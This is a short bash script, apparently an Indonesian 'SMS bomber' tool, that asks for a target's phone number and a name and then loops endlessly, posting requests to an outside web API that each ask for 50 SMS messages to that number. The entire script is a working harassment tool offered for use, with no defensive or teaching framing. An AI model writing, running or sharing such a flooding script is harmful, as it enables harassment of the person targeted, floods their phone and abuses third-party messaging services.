#!/bin/bash
echo "BOM SMS CUSTOM NAME Cli version by Sandro.putraa | API by Firman - SGB TEAM"
echo ""
read -p 'Nomer Target[Example 87714070299]: ' nmr
echo ""
read -p 'Nama: ' nama
echo ""
echo "RESULT :"
while :;do curl -X POST -d "nomer=$nmr&receiver=$nama&jumlah=50" https://www.bom.firmann.com/server1/index.php;done
